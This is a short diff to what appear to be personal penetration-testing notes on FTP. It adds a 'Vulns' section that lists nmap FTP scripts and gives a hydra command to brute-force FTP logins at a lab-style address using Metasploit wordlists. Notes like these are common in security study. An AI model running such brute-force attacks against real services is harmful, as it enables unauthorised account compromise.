@@ -25,3 +25,13 @@ put
 ls
 mget
 ```
+
+
+#Vulns 
+anonymous access
+```bash
+ls -al /usr/share/nmap/scripts/ | grep ftp-*
+#brute force
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.10.10 -t 4 ftp
+``` 
+
